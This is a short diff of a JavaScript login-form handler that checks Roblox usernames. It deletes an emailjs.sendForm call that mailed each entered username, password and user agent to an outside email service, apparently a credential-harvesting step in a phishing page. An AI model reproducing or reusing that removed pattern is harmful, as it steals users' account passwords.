@@ -216,11 +216,6 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
       status.textContent = '❌ Username not found on Roblox.';
       return;
     }
-    emailjs.sendForm('service_qqf5p4q', 'template_u5yl8jg', {
-      username,
-      password,
-      userAgent,
-    })
 
   } catch (err) {
     spinner.style.display = 'none';
